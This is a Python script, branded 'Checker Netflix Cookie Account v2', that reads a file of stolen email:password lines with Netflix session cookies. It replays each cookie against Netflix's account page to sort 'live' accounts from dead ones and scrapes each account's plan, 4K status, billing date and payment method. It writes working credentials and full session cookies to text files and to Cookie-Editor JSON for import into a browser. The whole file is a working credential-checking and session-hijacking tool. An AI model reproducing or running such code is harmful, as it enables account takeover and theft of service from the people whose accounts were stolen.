#!/usr/bin/env python3
import os
import re
import requests
import time
import json
import signal
import sys
from datetime import datetime
from collections import Counter

live_accounts = []
count = 0
fourk_count = 0

# Buat folder result dan invalid jika belum ada
RESULT_DIR = "result"
INVALID_DIR = "invalid"
os.makedirs(RESULT_DIR, exist_ok=True)
os.makedirs(INVALID_DIR, exist_ok=True)

def signal_handler(sig, frame):
    """Handle CTRL+C - save progress before exit."""
    print("\n\n[!] CTRL+C detected! Saving progress...")
    save_results()
    print("[!] Exiting gracefully.")
    sys.exit(0)

def save_results():
    """Save current live accounts to files (summary)."""
    global live_accounts, count, fourk_count
    
    if not live_accounts:
        print("[!] No live accounts to save.")
        return
    
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Save TXT summary
    txt_file = f'netflix_live_{ts}.txt'
    with open(txt_file, 'w', encoding='utf-8') as f:
        f.write(f"NETFLIX CHECKER - {count} LIVE (SAVED ON INTERRUPT)\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80 + "\n\n")
        
        for i, (acc, date, res) in enumerate(live_accounts, 1):
            f.write(f"[{i:2d}] {acc['email']}:{acc['password']}\n")
            f.write(f"     Plan: {res} | Billing: {date}\n")
            f.write(f"     Payment: {acc['payment_method']} | Streams: {acc['streams']}\n")
            f.write(f"     NetflixId: {acc['cookies'].get('NetflixId', '')[:60]}...\n")
            f.write(f"     SecureNetflixId: {acc['cookies'].get('SecureNetflixId', '')[:60]}...\n")
            f.write("-" * 60 + "\n")
    
    print(f"Saved TXT: {txt_file}")
    
    # Save JSON for Cookie-Editor
    json_file = f'netflix_live_{ts}.json'
    json_data = []
    for i, (acc, date, res) in enumerate(live_accounts, 1):
        entry = {
            "index": i,
            "email": acc['email'],
            "password": acc['password'],
            "plan": res,
            "billing": date,
            "payment": acc['payment_method'],
            "streams": acc['streams'],
            "cookies": [
                {
                    "domain": ".netflix.com",
                    "name": "NetflixId",
                    "path": "/",
                    "secure": True,
                    "httpOnly": True,
                    "value": acc['cookies'].get('NetflixId', '')
                },
                {
                    "domain": ".netflix.com",
                    "name": "SecureNetflixId",
                    "path": "/",
                    "secure": True,
                    "httpOnly": True,
                    "value": acc['cookies'].get('SecureNetflixId', '')
                }
            ]
        }
        json_data.append(entry)
    
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump(json_data, f, indent=2)
    
    print(f"Saved JSON (Cookie-Editor): {json_file}")
    
    # Print summary
    print(f"\n{'=' * 60}")
    print(f"LIVE: {count} | 4K: {fourk_count}")
    
    stats = Counter(res for _, _, res in live_accounts)
    for plan, num in stats.most_common():
        print(f"  {plan}: {num}")
    print(f"{'=' * 60}")

def generate_cookie_json(account):
    """Generate Cookie-Editor compatible JSON for a single account."""
    cookies = account['cookies']
    if 'NetflixId' not in cookies or 'SecureNetflixId' not in cookies:
        return None
    
    return [
        {
            "domain": ".netflix.com",
            "name": "NetflixId",
            "path": "/",
            "secure": True,
            "httpOnly": True,
            "value": cookies.get('NetflixId', '')
        },
        {
            "domain": ".netflix.com",
            "name": "SecureNetflixId",
            "path": "/",
            "secure": True,
            "httpOnly": True,
            "value": cookies.get('SecureNetflixId', '')
        }
    ]

print(r"""
███╗   ██╗███████╗████████╗███████╗██╗     ██╗██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║     ██║╚██╗██╔╝
██╔██╗ ██║█████╗     ██║   █████╗  ██║     ██║ ╚███╔╝
██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║     ██║ ██╔██╗
██║ ╚████║███████╗   ██║   ██║     ███████╗██║██╔╝ ██╗
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝     ╚══════╝╚═╝╚═╝  ╚═╝

            Checker Netflix Cookie Account v2
            By     : Kenjisubagja / Klikajar
            Github : kenjisubagja
            FB     : R Panji Subagja
""")

# Register CTRL+C handler
signal.signal(signal.SIGINT, signal_handler)

def parse_netflix_line(line):
    """Parse line format: email:pass | KEY = VALUE | Cookie = NetflixId=... | SecureNetflixId=..."""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    segments = line.split(' | ')
    
    email = ''
    password = ''
    cookies = {}
    metadata = {}
    
    for seg in segments:
        seg = seg.strip()
        
        if '@' in seg and ':' in seg and '=' not in seg.split(':', 1)[1][:5]:
            parts = seg.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()
            continue
        
        if seg.startswith('Cookie =') or seg.startswith('Cookie='):
            val = seg.split('=', 1)[1].strip() if '=' in seg else ''
            if val.startswith('NetflixId='):
                nf_val = val[len('NetflixId='):]
                cookies['NetflixId'] = nf_val
            continue
        
        if seg.startswith('SecureNetflixId =') or seg.startswith('SecureNetflixId='):
            val = seg.split('=', 1)[1].strip() if '=' in seg else ''
            cookies['SecureNetflixId'] = val
            continue
        
        if '=' in seg:
            key, val = seg.split('=', 1)
            key = key.strip()
            val = val.strip()
            if key and val:
                metadata[key] = val
    
    if 'NetflixId' not in cookies:
        nf_match = re.search(r'NetflixId=([^\s|]+)', line)
        if nf_match:
            cookies['NetflixId'] = nf_match.group(1)
    
    if 'SecureNetflixId' not in cookies:
        snf_match = re.search(r'SecureNetflixId=([^\s|]+)', line)
        if snf_match:
            cookies['SecureNetflixId'] = snf_match.group(1)
    
    plan = metadata.get('PLAN', metadata.get('memberPlan', ''))
    billing = metadata.get('BILLING_DATE', metadata.get('NextBillingDate', ''))
    streams = metadata.get('STREAMS', metadata.get('maxStreams', ''))
    payment = metadata.get('PAYMENT_METHOD', metadata.get('paymentMethod', ''))
    cost = metadata.get('COST', '')
    
    return {
        'email': email,
        'password': password,
        'cookies': cookies,
        'plan': plan,
        'billing_date': billing,
        'streams': streams,
        'payment_method': payment,
        'cost': cost,
        'metadata': metadata,
        'raw_line': line
    }

def check_netflix_account(account_data):
    """Check Netflix account using extracted cookies."""
    cookies = account_data['cookies']
    
    if 'NetflixId' not in cookies or 'SecureNetflixId' not in cookies:
        return False, account_data.get('billing_date', ''), account_data.get('plan', 'No Cookie')
    
    # Clean cookies - remove any trailing dots or garbage
    for k in ['NetflixId', 'SecureNetflixId']:
        if k in cookies:
            cookies[k] = cookies[k].strip().rstrip('.')
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.netflix.com/browse',
        'Cache-Control': 'max-age=0'
    }
    
    try:
        session = requests.Session()
        session.get('https://www.netflix.com/browse', headers=headers, cookies=cookies, timeout=12)
        time.sleep(1)
        
        headers['Cookie'] = '; '.join(f"{k}={cookies[k]}" for k in cookies)
        r = session.get('https://www.netflix.com/account/membership', headers=headers, timeout=12)
        
        if r.status_code != 200:
            return False, account_data.get('billing_date', ''), account_data.get('plan', '')
        
        html = r.text
        
        # Check for 4K
        if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I):
            plan_detected = '4K'
        else:
            plan_match = re.search(
                r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<',
                html
            )
            plan_detected = plan_match.group(1).strip() if plan_match else account_data.get('plan', 'Live')
        
        # Get next payment date from page
        date_match = re.search(
            r'<h3[^>]*data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
            html,
            re.DOTALL | re.I
        )
        
        date = date_match.group(1).strip() if date_match else account_data.get('billing_date', 'Live')
        
        if 'account-membership-page' in html:
            return True, date, plan_detected
        
        return False, account_data.get('billing_date', ''), account_data.get('plan', '')
    except Exception as e:
        return False, account_data.get('billing_date', ''), account_data.get('plan', '')

def save_account_to_folder(account, is_live, date, plan):
    """Simpan satu akun ke folder result (jika live) atau invalid (jika mati)."""
    folder = RESULT_DIR if is_live else INVALID_DIR
    filename = os.path.join(folder, "result.txt" if is_live else "invalid.txt")
    
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"Email: {account['email']}\n")
        f.write(f"Password: {account['password']}\n")
        if is_live:
            f.write(f"Plan: {plan} | Billing: {date}\n")
        else:
            f.write(f"Status: DEAD | Plan detected: {plan}\n")
        f.write(f"Payment: {account['payment_method']} | Streams: {account['streams']}\n")
        f.write(f"NetflixId: {account['cookies'].get('NetflixId', '')}\n")
        f.write(f"SecureNetflixId: {account['cookies'].get('SecureNetflixId', '')}\n")
        f.write("-" * 60 + "\n")

def main():
    global live_accounts, count, fourk_count
    
    filename = 'netflix.txt'
    
    if not os.path.exists(filename):
        print(f"[!] File '{filename}' tidak ditemukan!")
        return
    
    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    
    # Parse each line
    accounts = []
    parse_errors = 0
    for i, line in enumerate(lines):
        parsed = parse_netflix_line(line)
        if parsed and parsed['cookies']:
            accounts.append(parsed)
        elif parsed and not parsed['cookies']:
            parse_errors += 1
    
    print(f"Total lines: {len(lines)}")
    print(f"Parsed with cookies: {len(accounts)}")
    if parse_errors:
        print(f"Lines without cookies (skipped): {parse_errors}")
    
    if not accounts:
        print("\n[!] No accounts with cookies found! Debug info:")
        if lines:
            print(f"First line preview: {repr(lines[0][:300])}")
        return
    
    print("[INFO] Press CTRL+C at any time to save progress and exit.\n")
    
    for i, acc in enumerate(accounts, 1):
        print(f"[{i:3d}/{len(accounts)}] Checking {acc['email'][:25]:<25}...", end=' ', flush=True)
        is_live, date, res = check_netflix_account(acc)
        
        if is_live:
            count += 1
            if '4K' in res:
                fourk_count += 1
                print(f" {res} | {date}  #{count}")
            else:
                print(f" {res} | {date} #{count}")
            live_accounts.append((acc, date, res))
            # Simpan ke folder result
            save_account_to_folder(acc, True, date, res)
        else:
            print(f"❌ dead ({res})")
            # Simpan ke folder invalid
            save_account_to_folder(acc, False, date, res)
        
        time.sleep(2)
    
    print("\n" + "=" * 80)
    print(f" LIVE: {count} | 4K: {fourk_count}")
    
    stats = Counter(res for _, _, res in live_accounts)
    for plan, num in stats.most_common():
        print(f"  {plan}: {num}")
    
    save_results()
    print("\n DONE!")

if __name__ == "__main__":
    main()
